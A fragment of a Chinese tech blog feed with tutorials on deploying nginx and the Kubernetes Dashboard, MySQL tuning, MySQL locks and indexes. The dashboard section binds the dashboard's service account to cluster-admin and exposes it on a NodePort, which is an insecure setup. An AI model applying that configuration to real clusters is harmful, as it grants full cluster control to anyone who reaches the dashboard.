id="部署应用Nginx"><a href="#部署应用Nginx" class="headerlink" title="部署应用Nginx"></a>部署应用Nginx</h3><blockquote><p>先部署一个nginx，后续详细学习其中应用 service中的yaml参数含义以及写法</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#创建一个nginx目录</span><span class="token function">mkdir</span> nginx<span class="token builtin class-name">cd</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># vi nginx.yaml</span><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>test<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">selector</span><span class="token punctuation">:</span>    <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span>      <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx      <span class="token key atrule">env</span><span class="token punctuation">:</span> test      <span class="token key atrule">owner</span><span class="token punctuation">:</span> root  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">2</span> <span class="token comment"># tells deployment to run 2 pods matching the template</span>  <span class="token key atrule">template</span><span class="token punctuation">:</span>    <span class="token key atrule">metadata</span><span class="token punctuation">:</span>      <span class="token key atrule">labels</span><span class="token punctuation">:</span>        <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx        <span class="token key atrule">env</span><span class="token punctuation">:</span> test        <span class="token key atrule">owner</span><span class="token punctuation">:</span> root    <span class="token key atrule">spec</span><span class="token punctuation">:</span>      <span class="token key atrule">containers</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>test          <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span>1.19.9          <span class="token key atrule">ports</span><span class="token punctuation">:</span>            <span class="token punctuation">-</span> <span class="token key atrule">containerPort</span><span class="token punctuation">:</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>执行创建应用</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> nginx.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># vi nginx-service.yaml</span>apiVersion: v1kind: Servicemetadata:  name: nginx-test  labels:    run: nginxspec:  type: NodePort  ports:  - port: <span class="token number">80</span>    protocol: TCP  selector:    owner: root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>执行创建服务</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> nginx-service.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>验证是否创建成功</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@master01 nginx<span class="token punctuation">]</span><span class="token comment"># kubectl get pods -o wide </span>NAME                          READY   STATUS    RESTARTS   AGE   IP             NODE       NOMINATED NODE   READINESS GATESnginx-test-7d95fb4447-52j86   <span class="token number">1</span>/1     Running   <span class="token number">0</span>          18m   <span class="token number">10.244</span>.30.66   worker02   <span class="token operator">&lt;</span>none<span class="token operator">></span>           <span class="token operator">&lt;</span>none<span class="token operator">></span>nginx-test-7d95fb4447-zfbgm   <span class="token number">1</span>/1     Running   <span class="token number">0</span>          18m   <span class="token number">10.244</span>.5.2     worker01   <span class="token operator">&lt;</span>none<span class="token operator">></span>           <span class="token operator">&lt;</span>none<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@master01 nginx<span class="token punctuation">]</span><span class="token comment"># kubectl get svc -o wide</span>NAME         TYPE        CLUSTER-IP    EXTERNAL-IP   PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span>        AGE   SELECTORkubernetes   ClusterIP   <span class="token number">10.96</span>.0.1     <span class="token operator">&lt;</span>none<span class="token operator">></span>        <span class="token number">443</span>/TCP        24h   <span class="token operator">&lt;</span>none<span class="token operator">></span>nginx-test   NodePort    <span class="token number">10.110</span>.6.84   <span class="token operator">&lt;</span>none<span class="token operator">></span>        <span class="token number">80</span>:30518/TCP   18m   <span class="token assign-left variable">owner</span><span class="token operator">=</span>rancher<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里对应的<strong>30518</strong>就是系统默认分配的对外暴露端口</p><p>访问 <a href="http://192.168.100.11:30518/">http://192.168.100.11:30518/</a> 出现nginx首页即成功</p><h3 id="安装Dashboard控制面板"><a href="#安装Dashboard控制面板" class="headerlink" title="安装Dashboard控制面板"></a>安装Dashboard控制面板</h3><p>github地址 <a href="https://github.com/kubernetes/dashboard">https://github.com/kubernetes/dashboard</a></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /root/kube-dashboard<span class="token builtin class-name">cd</span> /root/kube-dashboard<span class="token function">wget</span> https://raw.githubusercontent.com/kubernetes/dashboard/v2.5.1/aio/deploy/recommended.yaml<span class="token comment"># 修改配置文件将</span>spec:  ports:    - port: <span class="token number">443</span>      targetPort: <span class="token number">8443</span><span class="token comment">#改成</span>spec:  type: NodePort  ports:    - port: <span class="token number">443</span>      targetPort: <span class="token number">8443</span>      nodePort: <span class="token number">30000</span>      <span class="token comment">#修改权限将</span>apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: kubernetes-dashboardroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: kubernetes-dashboardsubjects:  - kind: ServiceAccount    name: kubernetes-dashboard    namespace: kubernetes-dashboard<span class="token comment">#改成</span>apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: kubernetes-dashboardroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: cluster-adminsubjects:  - kind: ServiceAccount    name: kubernetes-dashboard    namespace: kubernetes-dashboard    <span class="token comment"># 其实就是这里   name: kubernetes-dashboard==》     name: cluster-admin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> recommended.yaml<span class="token punctuation">[</span>root@master01 kube-dashboard<span class="token punctuation">]</span><span class="token comment"># kubectl get namespace</span>NAME                   STATUS   AGEdefault                Active   24hkube-node-lease        Active   24hkube-public            Active   24hkube-system            Active   24hkubernetes-dashboard   Active   39s<span class="token punctuation">[</span>root@master01 kube-dashboard<span class="token punctuation">]</span><span class="token comment"># kubectl get pods -n kubernetes-dashboard</span>NAME                                        READY   STATUS    RESTARTS   AGEdashboard-metrics-scraper-c45b7869d-lj5gd   <span class="token number">1</span>/1     Running   <span class="token number">1</span>          23mkubernetes-dashboard-6bcfd5644-gn7l5        <span class="token number">1</span>/1     Running   <span class="token number">0</span>          85s<span class="token punctuation">[</span>root@master01 kube-dashboard<span class="token punctuation">]</span><span class="token comment"># ss -anput|grep ":30000"</span>tcp    LISTEN     <span class="token number">0</span>      <span class="token number">128</span>       *:30000                 *:*                   users:<span class="token variable"><span class="token punctuation">((</span>"kube<span class="token operator">-</span>proxy"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">27644</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL进阶(五)-性能优化篇</title>
    <link href="/posts/30a541b.html"/>
    <url>/posts/30a541b.html</url>
    
    <content type="html"><![CDATA[<p> MySQL数据库调优</p><span id="more"></span><h2 id="调优范围"><a href="#调优范围" class="headerlink" title="调优范围"></a>调优范围</h2><ul><li><p><strong>调SQL语句</strong>：根据需求创建结构良好的SQL语句</p></li><li><p><strong>调索引</strong>：索引创建原则</p></li><li><p><strong>调数据库表结构</strong></p></li><li><p><strong>调MySQL配置</strong>：最大连接数，连接超时，线程缓存，查询缓存，排序缓存，连接查询缓存…</p></li><li><p><strong>调MySQL宿主机OS</strong>：TCP连接数，打开文件数，线程栈大小</p></li><li><p><strong>调服务器硬件</strong>：更多核CPU、更大内存</p></li><li><p><strong>MySQL客户端</strong>：连接池（MaxActive，MaxWait），连接属性</p></li></ul><h2 id="执行计划Explain"><a href="#执行计划Explain" class="headerlink" title="执行计划Explain"></a>执行计划Explain</h2><p><img src="http://file.hyqup.cn/img/%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92Explain.png" alt="执行计划Explain"></p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXPLAIN</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><ul><li><p>id：SELECT识别符，这是SELECT查询序列号。</p></li><li><p><strong>select_type</strong>：表示单位查询的查询类型，比如：普通查询、联合查询(union、union all)、查询等复杂查询。</p></li><li><p>table：表示查询的表</p></li><li><p>partitions：使用的哪些分区（对于非分区表值为null）。</p></li><li><p><strong>type</strong>（重要）表示表的连接类型。</p></li><li><p>possible_keys：此次查询中可能选用的索引</p></li><li><p>key：查询真正使用到的索引</p></li><li><p>key_len：显示MySQL决定使用的索引size</p></li><li><p>ref：哪个字段或常数与 key 一起被使用</p></li><li><p><strong>rows</strong>：显示此查询一共扫描了多少行，这个是一个估计值，不是精确的值。</p></li><li><p>filtered: 表示此查询条件所过滤的数据的百分比</p></li><li><p><strong>Extra</strong>：额外信息</p></li></ul><h4 id="select-type参数"><a href="#select-type参数" class="headerlink" title="select_type参数"></a>select_type参数</h4><blockquote><p>总体分为三大类，简单查询，连接查询，子查询</p></blockquote><ul><li><p><strong>simple</strong> 简单查询</p></li><li><p><strong>primary</strong> 主表，多张表的时候有一张主表</p></li><li><p><strong>union</strong>：连接查询</p></li><li><p><strong>dependent union</strong> 依赖连接查询</p></li><li><p><strong>subquery</strong>：子查询</p></li><li><p><strong>dependent subquery</strong>：依赖子查询</p></li><li><p><strong>derived</strong>：派生表</p></li></ul><h4 id="type参数"><a href="#type参数" class="headerlink" title="type参数"></a>type参数</h4><blockquote><p>显示的是单位查询的<strong>连接类型</strong>或者理解为<strong>访问类型</strong></p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">systemconsteq_refreffulltextref_or_nullunique_subqueryindex_subqueryrangeindex_merge<span class="token keyword">index</span><span class="token keyword">ALL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h5 id="system"><a href="#system" class="headerlink" title="system"></a>system</h5><p>表中<strong>只有一行数据或者是空表</strong></p><h5 id="const"><a href="#const" class="headerlink" title="const"></a><strong><code>const</code></strong></h5><p>使用<strong>唯一索引或者主键</strong></p><p><strong><code>eq_ref</code></strong></p><p><strong>唯一性索引扫描</strong></p><h5 id="ref"><a href="#ref" class="headerlink" title="ref"></a><code>ref</code></h5><p><strong>非唯一性索</strong>引扫描</p><h5 id="fulltext"><a href="#fulltext" class="headerlink" title="fulltext"></a><strong>fulltext</strong></h5><p>全文索引检索</p><h5 id="ref-or-null"><a href="#ref-or-null" class="headerlink" title="ref_or_null"></a><strong>ref_or_null</strong></h5><p>与ref方法类似，只是增加了null值的比较</p><h5 id="unique-subquery"><a href="#unique-subquery" class="headerlink" title="unique_subquery"></a><strong>unique_subquery</strong></h5><p>用于where中的in形式子查询，子查询返回不重复值唯一值</p><h5 id="index-subquery"><a href="#index-subquery" class="headerlink" title="index_subquery"></a><strong>index_subquery</strong></h5><p>用于in形式子查询使用到了辅助索引或者in常数列表，子查询可能返回重复值，可以使用索引将子查询去重</p><h5 id="range"><a href="#range" class="headerlink" title="range"></a><strong><code>range</code></strong></h5><p><strong>索引范围扫描</strong>，常见于使用&gt;,&lt;,is null,between ,in ,like等运算符的查询中</p><h5 id="index-merge"><a href="#index-merge" class="headerlink" title="index_merge"></a><strong>index_merge</strong></h5><p>表示查询使用了两个以上的索引，最后取交集或者并集，常见and ，or的条件使用了不同的索引</p><h5 id="index"><a href="#index" class="headerlink" title="index"></a><strong><code>index</code></strong></h5><p>select结果列中使用到了索引，type会显示为index。<strong>全部索引扫描</strong>，把索引从头到尾扫一遍，常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询</p><h5 id="all"><a href="#all" class="headerlink" title="all"></a><strong><code>all</code></strong></h5><p>这个就是全表扫描数据文件，然后再<strong>在<strong><strong>server</strong></strong>层进行过滤</strong>返回符合要求的记录</p><h4 id="Extra参数"><a href="#Extra参数" class="headerlink" title="Extra参数"></a><strong>Extra参数</strong></h4><ul><li><p><strong>Using filesort</strong></p><p>使用了文件排序</p></li><li><p><strong>Using index</strong></p><p>表示相应的SELECT查询中使用到了索引，避免访问表的数据行，这种查询的效率很高！</p></li><li><p><strong>Using where</strong></p><p>MySQL将对InnoDB提取的结果在SQL Layer层进行过滤</p></li><li><p><strong>Using join buffer</strong></p><p>使用了连接缓存</p></li></ul><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>创建索引的原则，判断组合索引失效场景</p><h3 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h3><p><strong>查看是否开启慢查询功能</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查看是否开启慢查询日志</span><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow_query%'</span><span class="token punctuation">;</span><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'long_query_time%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>slow_query_log：是否开启慢查询日志，1为开启，0为关闭</p><p>log-slow-queries：旧版（5.6以下）MySQL数据库慢查询日志存储路径。</p><p>slow-query-log-file：新版（5.6及以上）MySQL数据库慢查询日志存储路径。</p><p>​不设置该参数，系统则会默认给一个文件host_name-slow.log</p><p>long_query_time：慢查询阈值，当查询时间多于设定的阈值时，记录日志，单位秒</p><h3 id="开启慢查询"><a href="#开启慢查询" class="headerlink" title="开启慢查询"></a>开启慢查询</h3><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 开启慢查询日志</span><span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span><span class="token comment"># 大于1秒钟的数据记录到慢日志中，如果设置为默认0，则会有大量的信息存储在磁盘中，磁盘很容易满</span>掉<span class="token comment"># 如果设置不生效，建议配置在my.cnf配置文件中</span><span class="token keyword">set</span> <span class="token keyword">global</span> long_query_time<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment"># 记录没有索引的查询。</span><span class="token keyword">set</span> <span class="token keyword">global</span> log_queries_not_using_indexes<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="连接数max-connections"><a href="#连接数max-connections" class="headerlink" title="连接数max_connections"></a><strong>连接数</strong>max_connections</h3><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查看 max_connections</span><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'max_connections'</span><span class="token comment"># 设置 max_connections（立即生效重启后失效）</span><span class="token keyword">set</span> <span class="token keyword">global</span> max_connections <span class="token operator">=</span> <span class="token number">800</span><span class="token punctuation">;</span><span class="token comment"># 这台MySQL服务器最大连接数是256，然后查询一下服务器使用过的最大连接数：</span><span class="token keyword">show</span> <span class="token keyword">global</span> <span class="token keyword">status</span> <span class="token operator">like</span> <span class="token string">'Max_used_connections'</span><span class="token punctuation">;</span><span class="token comment"># MySQL服务器过去的最大连接数是245，没有达到服务器连接数上限256，应该没有出现1040错误，</span>比较理想的设置是：Max_used_connections <span class="token operator">/</span> max_connections <span class="token operator">*</span> <span class="token number">100</span><span class="token operator">%</span> ≈ <span class="token number">85</span><span class="token operator">%</span>最大连接数占上限连接数的<span class="token number">85</span><span class="token operator">%</span>左右，如果发现比例在<span class="token number">10</span><span class="token operator">%</span>以下，MySQL服务器连接数上限设置的过高了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL进阶(四)-锁篇</title>
    <link href="/posts/e7da88f5.html"/>
    <url>/posts/e7da88f5.html</url>
    
    <content type="html"><![CDATA[<p>MySQL中的锁，共享锁、排它锁、全局锁、表锁、行锁、读锁、写锁等</p><span id="more"></span><h2 id="锁分类"><a href="#锁分类" class="headerlink" title="锁分类"></a>锁分类</h2><p>MySQL加锁过程</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> tab_user <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'曹操'</span> <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><img src="http://file.hyqup.cn/img/%E5%8A%A0%E9%94%81%E8%BF%87%E7%A8%8B.png" alt="加锁过程"></p><h3 id="功能划分"><a href="#功能划分" class="headerlink" title="功能划分"></a><strong>功能划分</strong></h3><p>**<code>共享锁（shared lock）</code>**：也叫S锁、读锁，读锁是共享的，读锁之间互相不阻塞</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> … <span class="token keyword">lock</span> <span class="token operator">in</span> <span class="token keyword">share</span> <span class="token keyword">mode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>**<code>排他锁（exclusive lock）</code>**：也叫X锁、写锁，写锁是排他的，写锁阻塞其他的读和写锁</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> … <span class="token keyword">for</span> <span class="token keyword">update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="按粒度分"><a href="#按粒度分" class="headerlink" title="按粒度分"></a><strong>按粒度分</strong></h3><ul><li>全局锁：锁整Database，由MySQL的SQL layer层实现</li><li>表级锁：锁某Table，由MySQL的SQL layer层实现</li><li>行级锁：锁某Row的索引，也可锁定行索引之间的间隙，由存储引擎实现【InnoDB】<ul><li>记录锁（Record Locks）：锁定索引中一条记录</li><li>间隙锁（Gap Locks）：仅仅锁住一个索引区间</li><li>临键锁（Next-Key Locks）：记录锁和间隙锁的组合，<strong>解决幻读问题</strong></li><li>插入意向锁(Insert Intention Locks)：做insert时添加的对记录id的锁</li><li>意向锁：存储引擎级别的“表级”锁</li></ul></li></ul><h2 id="全局锁"><a href="#全局锁" class="headerlink" title="全局锁"></a>全局锁</h2><p>全局锁是对整个数据库实例加锁，加锁后整个实例就处于只读状态，将阻塞DML、DDL及已经更新但未提交的语句</p><p>应用场景：全库逻辑备份</p><h3 id="表锁相关命令"><a href="#表锁相关命令" class="headerlink" title="表锁相关命令"></a><strong>表锁相关命令</strong></h3><p>加锁命令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">flush <span class="token keyword">tables</span> <span class="token keyword">with</span> <span class="token keyword">read</span> <span class="token keyword">lock</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>释放锁命令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">unlock</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>注：**<code>断开Session锁自动释放全局锁</code>**</p><h2 id="表级锁"><a href="#表级锁" class="headerlink" title="表级锁"></a>表级锁</h2><ul><li><p><code>表读锁（Table Read Lock）</code>，阻塞对当前表的写，但不阻塞读</p></li><li><p><code>表写锁（Table Write Lock）</code>，阻塞对当前表的读和写</p></li><li><p><code>元数据锁（Meta Data Lock，MDL)</code>，不需要显式指定，在访问表时会被自动加上，作用保证读写的正确性</p><ul><li>当对表做<strong>增删改查</strong>操作的时<strong>加元数据读锁</strong></li><li>当对表做<strong>结构变更</strong>操作的时<strong>加元数据写锁</strong></li></ul></li><li><p><code>自增锁(AUTO-INC Locks)</code>， AUTO-INC是一种特殊的表级锁，自增列事务性插入操作时产生</p></li></ul><h3 id="表锁相关命令-1"><a href="#表锁相关命令-1" class="headerlink" title="表锁相关命令"></a><strong>表锁相关命令</strong></h3><ul><li><p>查看表锁定状态：show status like ‘table_locks%’;</p></li><li><p>添加表读锁：lock table t read;</p></li><li><p>添加表写锁：lock table t write;</p></li><li><p>查看表锁情况：show open tables;</p></li><li><p>删除表锁：unlock tables;</p></li></ul><h2 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a><strong>行锁</strong></h2><blockquote><p>MySQL的行级锁是由存储引擎实现，<strong>InnoDB行锁</strong>是通过给索引上的<strong>索引项加锁来实现</strong></p></blockquote><p>注：<strong>只有通过索引条件检索的数据InnoDB才使用行级锁，否则InnoDB都将使用表锁</strong></p><h3 id="按范围分："><a href="#按范围分：" class="headerlink" title="按范围分："></a><strong>按范围分：</strong></h3><p>记录锁（Record Locks）、间隙锁（Gap Locks）、临键锁（Next-Key Locks）、插入意向锁（Insert Intention Locks）</p><h3 id="按功能分："><a href="#按功能分：" class="headerlink" title="按功能分："></a>按功能分：</h3><p>读锁：允许事务<strong>去读</strong>目标行，阻止其他事务<strong>更新</strong>。阻止其他事务加写锁，但不阻止加读锁</p><p>写锁：允许事务<strong>更新</strong>目标行，阻止其他事务<strong>获取或修改</strong>。同时阻止其他事务加读锁和写锁。</p><h3 id="如何加锁"><a href="#如何加锁" class="headerlink" title="如何加锁?"></a>如何加锁?</h3><ul><li><p>对于Update、Delete和Insert语句，InnoDB会自动给涉及数据集加<strong>写锁</strong></p></li><li><p>对于普通Select语句，<strong>InnoDB不会加任何锁</strong></p></li><li><p>事务手动给Select记录集加读锁或写锁</p></li><li><p>手动加锁</p><ul><li><p><strong>添加读锁</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> xx <span class="token keyword">lock</span> <span class="token operator">in</span> <span class="token keyword">share</span> <span class="token keyword">mode</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure></li><li><p><strong>添加写锁</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> xx <span class="token keyword">for</span> <span class="token keyword">update</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure></li></ul></li></ul><h3 id="行锁四兄弟：记录、间隙、临键和插入意向锁"><a href="#行锁四兄弟：记录、间隙、临键和插入意向锁" class="headerlink" title="行锁四兄弟：记录、间隙、临键和插入意向锁"></a><strong>行锁四兄弟：记录、间隙、临键和插入意向锁</strong></h3><h4 id="记录锁"><a href="#记录锁" class="headerlink" title="记录锁"></a><strong>记录锁</strong></h4><blockquote><p>记录锁（Record Locks）仅仅锁住索引记录的一行</p></blockquote><ul><li>记录锁锁住的永远是索引，而非记录本身，即使该表上没有任何显示索引 </li><li>没有索引，InnoDB会创建隐藏列ROWID的聚簇索引</li></ul><h4 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h4><blockquote><p>间隙锁（Gap Locks）仅仅锁住一个索引区间，开区间，不包括双端端点和索引记录</p></blockquote><ul><li>在索引记录间隙中加锁，并不包括该索引记录本身</li><li>间隙锁可用于防止幻读，保证索引间隙不会被插入数据</li></ul><h4 id="临键锁"><a href="#临键锁" class="headerlink" title="临键锁"></a>临键锁</h4><blockquote><p>临键锁（Next-Key Locks）相当于记录锁 + 间隙锁，左开右闭区间</p></blockquote><ul><li>默认情况下，InnoDB使用临键锁来锁定记录，但会在不同场景中退化</li><li>场景01-唯一性字段等值（&#x3D;）且记录存在，退化为<strong>记录锁</strong></li><li>场景02-唯一性字段等值（&#x3D;）且记录不存在，退化为<strong>间隙锁</strong></li><li>场景03-唯一性字段范围（&lt; &gt;），还是<strong>临键锁</strong></li><li>场景04-非唯一性字段，默认是<strong>临键锁</strong></li></ul><h4 id="插入意向锁"><a href="#插入意向锁" class="headerlink" title="插入意向锁"></a><strong>插入意向锁</strong></h4><blockquote><p>插入意向锁（Insert Intention Locks）是一种在 INSERT 操作之前设置的一种特殊的间隙锁</p></blockquote><ul><li>插入意向锁表示了一种插入意图，即当多个不同的事务，同时往<strong>同一个索引</strong>的<strong>同一个间隙</strong>中插入数据的时候，它们互相之间无需等待，即不会阻塞</li><li>插入意向锁不会阻止插入意向锁，但是插入意向锁会阻止其他<strong>间隙写锁（排他锁）、记录锁</strong></li></ul><h3 id="加锁规则"><a href="#加锁规则" class="headerlink" title="加锁规则"></a>加锁规则</h3><p><strong>主键索引：</strong></p><ul><li><p>等值条件，命中加记录锁</p></li><li><p>等值条件，未命中加间隙锁</p></li><li><p>范围条件，命中包含where条件的临键区间加临键锁</p></li><li><p>范围条件，没有命中加间隙锁</p></li></ul><p><strong>辅助索引：</strong></p><ul><li><p>等值条件，命中，命中记录辅助索引项，回表主键索引项加记录锁，辅助索引项两侧加间隙锁</p></li><li><p>等值条件，未命中加间隙锁</p></li><li><p>范围条件，命中包含where条件的临键区间加临键锁。命中记录回表主键索引项加记录锁</p></li><li><p>范围条件，没有命中加间隙锁</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL进阶(三)-索引篇</title>
    <link href="/posts/31dcd61.html"/>
    <url>/posts/31dcd61.html</url>
    
    <content type="html"><![CDATA[<p>MySQL索引概念，常见索引，聚簇索引，辅助索引，组合索引，唯一性索引</p><span id="more"></span><blockquote><p>索引是数据库 <strong>高效获取数据</strong>的<strong>数据结构，</strong>加快查询速度，索引一般存储在表空间中，也就是磁盘里</p></blockquote><h2 id="优势与劣势"><a href="#优势与劣势" class="headerlink" title="优势与劣势"></a><strong>优势与劣势</strong></h2><p>优势：<strong>两降一升</strong>，降低磁盘IO频次、降低数据排序的成本，提高数据检索效率</p><p>劣势：占用更多磁盘空间（<code>空间换时间</code>），降低更新效率</p><h2 id="索引操作"><a href="#索引操作" class="headerlink" title="索引操作"></a>索引操作</h2><p><strong>删除索引</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> index_name <span class="token keyword">ON</span> <span class="token keyword">table</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><strong>查看索引</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> <span class="token keyword">INDEX</span> <span class="token keyword">FROM</span> table_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>常见可以创建 主键索引、唯一索引、普通索引、全文索引、前缀索引、组合索引</p><h2 id="索引的数据结构"><a href="#索引的数据结构" class="headerlink" 